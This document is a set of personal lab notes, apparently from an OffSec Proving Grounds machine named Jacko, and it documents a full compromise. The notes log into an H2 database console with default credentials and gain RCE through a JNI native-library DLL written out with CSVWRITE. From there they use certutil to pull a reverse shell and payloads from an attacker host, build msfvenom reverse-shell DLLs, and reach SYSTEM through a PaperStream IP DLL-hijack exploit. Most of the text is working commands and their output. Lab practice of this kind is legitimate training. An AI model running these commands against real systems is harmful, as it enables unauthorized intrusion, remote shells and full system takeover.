@@ -1,0 +1,239 @@
+No credentials were provided for this machine
+
+nmap -vvv -T5 -Pn 192.168.192.66 -p- -A -oN nmap.txt
+
+sudo echo "192.168.192.66 jacko.offsec" | sudo tee -a /etc/hosts
+
+http://jacko.offsec/
+
+http://jacko.offsec/html/main.html
+
+http://jacko.offsec/html/quickstart.html
+
+"Also, a new browser page should open with the URL http://localhost:8082. You may get a security warning from the firewall. If you don't want other computers in the network to access the database on your machine, you can let the firewall block these connections. Only local connections are required at this time."
+
+https://stackoverflow.com/questions/8695420/what-is-the-default-username-and-password-for-h2-when-theres-nothing-explicit-i
+
+name = "sa"
+password = ""
+
+http://jacko.offsec:8082/login.do?jsessionid=59037a82cc917cab8118e44433f83719
+
+https://medium.com/r3d-buck3t/chaining-h2-database-vulnerabilities-for-rce-9b535a9621a2
+
+Run this command --> SELECT FILE_READ('C:\output.txt', NULL);
+
+Output 
+------------------------------------
+SELECT FILE_READ('C:\output.txt', NULL);
+FILE_READ('C:\output.txt', NULL)  
+ï»¿**********************
+Windows PowerShell transcript start
+Start time: 20251022081937
+Username: JACKO\Administrator
+RunAs User: JACKO\Administrator
+Configuration Name:
+Machine: JACKO (Microsoft Windows NT 10.0.18363.0)
+Host Application: C:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy bypass -WindowStyle Hidden -NoProfile -Command C:\freezeScript\win10.ps1
+Process ID: 2464
+PSVersion: 5.1.18362.752
+PSEdition: Desktop
+PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.18362.752
+BuildVersion: 10.0.18362.752
+CLRVersion: 4.0.30319.42000
+WSManStackVersion: 3.0
+PSRemotingProtocolVersion: 2.3
+SerializationVersion: 1.1.0.1
+.......
+
+Version --> H2 1.4.199 (2019-03-13)
+
+https://www.exploit-db.com/exploits/49384
+
+https://codewhitesec.blogspot.com/2019/08/exploit-h2-database-native-libraries-jni.html
+
+SELECT CSVWRITE('C:\Windows\Temp\JNIScriptEngine.dll', CONCAT('SELECT NULL "', CHAR(0x4d),CHAR(0x5a),CHAR(0x90),CHAR(0x00),CHAR(0x03),CHAR(0x00),CHAR(0x00)...
+...
+(0x00),CHAR(0x00),CHAR(0x00),CHAR(0x00),CHAR(0x00),CHAR(0x00),CHAR(0x00),CHAR(0x00),CHAR(0x00),CHAR(0x00),'"'), 'ISO-8859-1', '', '', '', '', '');
+
+-- Load native library
+CREATE ALIAS IF NOT EXISTS System_load FOR "java.lang.System.load";
+CALL System_load('C:\Windows\Temp\JNIScriptEngine.dll');
+
+-- Evaluate script
+CREATE ALIAS IF NOT EXISTS JNIScriptEngine_eval FOR "JNIScriptEngine.eval";
+
+-- Exec payload
+CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("whoami").getInputStream()).useDelimiter("\\Z").next()');
+CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("systeminfo").getInputStream()).useDelimiter("\\Z").next()');
+CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("certutil.exe -f -urlcache -split http://192.168.45.170:8000/shell.exe C:/users/tony/desktop/shell.exe").getInputStream()).useDelimiter("\\Z").next()');
+CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("C:/users/tony/desktop/shell.exe").getInputStream()).useDelimiter("\\Z").next()');
+
+┌──(lepotekil㉿kali)-[~/proving-ground-prac/jacko]
+└─$ nc -lvnp 5555       
+listening on [any] 5555 ...
+connect to [192.168.45.170] from (UNKNOWN) [192.168.192.66] 49859
+Microsoft Windows [Version 10.0.18363.836]
+(c) 2019 Microsoft Corporation. All rights reserved.
+
+C:\Program Files (x86)\H2\service>
+
+https://www.exploit-db.com/exploits/49382
+
+┌──(lepotekil㉿kali)-[~/proving-ground-prac/jacko]
+└─$ msfvenom -p windows/x64/shell_reverse_tcp -f dll -o shell.dll LHOST=192.168.45.170 LPORT=443
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 460 bytes
+Final size of dll file: 9216 bytes
+Saved as: shell.dll
+
+C:\>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+Try the new cross-platform PowerShell https://aka.ms/pscore6
+
+https://github.com/itm4n/PrivescCheck
+
+PS C:\> cd C:/users/tony/desktop/
+cd C:/users/tony/desktop/
+PS C:\users\tony\desktop> type local.txt
+type local.txt
+aa10c452fdd803c421f005a8187528bd
+PS C:\users\tony\desktop> C:\Windows\System32\certutil.exe -f -urlcache -split http://192.168.45.170:8000/PrivescCheck.ps1 PrivescCheck.ps1
+C:\Windows\System32\certutil.exe -f -urlcache -split http://192.168.45.170:8000/PrivescCheck.ps1 PrivescCheck.ps1
+****  Online  ****
+  000000  ...
+  035411
+CertUtil: -URLCache command completed successfully.
+PS C:\users\tony\desktop> C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
+
+????????????????????????????????????????????????????????????????
+? CATEGORY ? TA0004 - Privilege Escalation                     ?
+? NAME     ? User - Privileges                                 ?
+? TYPE     ? Base                                              ?
+????????????????????????????????????????????????????????????????
+? Check whether the current user is granted privileges that    ?
+? can be leveraged for local privilege escalation.             ?
+????????????????????????????????????????????????????????????????
+
+Name                          State    Description                               Exploitable
+----                          -----    -----------                               -----------
+SeShutdownPrivilege           Disabled Shut down the system                            False
+SeChangeNotifyPrivilege       Enabled  Bypass traverse checking                        False
+SeUndockPrivilege             Disabled Remove computer from docking station            False
+SeImpersonatePrivilege        Enabled  Impersonate a client after authentication        True
+SeCreateGlobalPrivilege       Enabled  Create global objects                           False
+SeIncreaseWorkingSetPrivilege Disabled Increase a process working set                  False
+SeTimeZonePrivilege           Disabled Change the time zone                            False
+
+[*] Status: Vulnerable - Severity: High - Execution time: 00:00:00.042
+
+----------------------------------------------------------------
+
+????????????????????????????????????????????????????????????????
+? CATEGORY ? TA0004 - Privilege Escalation                     ?
+? NAME     ? Configuration - PATH Folder Permissions           ?
+? TYPE     ? Base                                              ?
+????????????????????????????????????????????????????????????????
+? Check whether the current user has any write permissions on  ?
+? the system-wide PATH folders. If so, the system could be     ?
+? vulnerable to privilege escalation through ghost DLL         ?
+? hijacking.                                                   ?
+????????????????????????????????????????????????????????????????
+
+Path              : C:\JavaTemp\
+ModifiablePath    : C:\JavaTemp\
+IdentityReference : NT AUTHORITY\Authenticated Users (S-1-5-11)
+Permissions       : ListDirectory, AddFile, AddSubdirectory, ReadExtendedAttributes, WriteExtendedAttributes, 
+                    Traverse, ReadAttributes, WriteAttributes, Delete, ReadControl, Synchronize, GenericRead, 
+                    GenericExecute, GenericWrite
+
+[*] Status: Vulnerable - Severity: High - Execution time: 00:00:00.111
+
+PS C:\users\tony\desktop> Get-WMIObject Win32_InstalledWin32Program | select Name, Version, ProgramId
+Get-WMIObject Win32_InstalledWin32Program | select Name, Version, ProgramId
+
+Name                                                          Version          ProgramId                               
+----                                                          -------          ---------                               
+VMware Tools                                                  10.3.10.12406962 000076e63b8de0cb87389d57d7b25d54d0a80...
+Java 8 Update 251 (64-bit)                                    8.0.2510.8       0000cef6aafc32d9e0be2ab4805d161bc3400...
+Scanner Central Admin Agent                                   1.04.0026.23     0000e9988a29afa4d2767714bee81d1d037b0...
+Software Operation Panel                                                       00004484dab29ff3e5d4130a683a58b85c610...
+PaperStream IP (TWAIN)                                        1.42.0.5685      000018b054d519c86a0d6a4d729ed2a773db0...
+Software Operation Panel                                      4.5.4.0          0000ec87fa2983b44c9cd91ae3e181b8ec8b0...
+Microsoft Visual C++ 2017 Redistributable (x86) - 14.12.25810 14.12.25810.0    0000b599e632970468f205d794760cf82dc70...
+Microsoft Visual C++ 2017 Redistributable (x64) - 14.12.25810 14.12.25810.0    0000a5c8d73a8a4913750a2b7678f38ef28a0...
+H2                                                                             00008e633f84a42eef54d359cee661f3d5260...
+
+
+PS C:\users\tony\desktop>
+
+https://www.exploit-db.com/exploits/49382
+
+PaperStream IP (TWAIN) 1.42.0.5685 - Local Privilege Escalation
+
+┌──(lepotekil㉿kali)-[~/proving-ground-prac/jacko]
+└─$ msfvenom -p windows/shell_reverse_tcp -f dll -o UninOldIS.dll LHOST=192.168.45.170 LPORT=6666 
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder specified, outputting raw payload
+Payload size: 324 bytes
+Final size of dll file: 9216 bytes
+Saved as: UninOldIS.dll
+
+PS C:\users\tony\desktop> C:\Windows\System32\certutil.exe -f -urlcache -split http://192.168.45.170:8000/UninOldIS.dll C:/Windows/Temp/UninOldIS.dll
+C:\Windows\System32\certutil.exe -f -urlcache -split http://192.168.45.170:8000/UninOldIS.dll C:/Windows/Temp/UninOldIS.dll
+****  Online  ****
+  0000  ...
+  2400
+CertUtil: -URLCache command completed successfully.
+
+PS C:\users\tony\desktop> C:\Windows\System32\certutil.exe -f -urlcache -split http://192.168.45.170:8000/exploit.ps1 exploit.ps1
+C:\Windows\System32\certutil.exe -f -urlcache -split http://192.168.45.170:8000/exploit.ps1 exploit.ps1
+****  Online  ****
+  0000  ...
+  05a5
+CertUtil: -URLCache command completed successfully.
+
+PS C:\users\tony\desktop> C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ep bypass -c ". .\exploit.ps1"
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ep bypass -c ". .\exploit.ps1"
+Writable location found, copying payload to C:\JavaTemp\
+Payload copied, triggering...
+
+┌──(lepotekil㉿kali)-[~/proving-ground-prac/jacko]
+└─$ nc -lvnp 6666
+listening on [any] 6666 ...
+connect to [192.168.45.170] from (UNKNOWN) [192.168.192.66] 49712
+Microsoft Windows [Version 10.0.18363.836]
+(c) 2019 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+nt authority\system
+
+C:\Windows\system32>cd C:\users\administrator\desktop\
+cd C:\users\administrator\desktop\
+
+C:\Users\Administrator\Desktop>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is AC2F-6399
+
+ Directory of C:\Users\Administrator\Desktop
+
+05/03/2022  06:32 PM    <DIR>          .
+05/03/2022  06:32 PM    <DIR>          ..
+04/27/2020  09:11 PM             1,450 Microsoft Edge.lnk
+10/23/2025  01:30 AM                34 proof.txt
+               2 File(s)          1,484 bytes
+               2 Dir(s)   3,726,462,976 bytes free
+
+C:\Users\Administrator\Desktop>type proof.txt
+type proof.txt
+570d24c54feca80f0b2d4470a35ad233
+
+C:\Users\Administrator\Desktop>
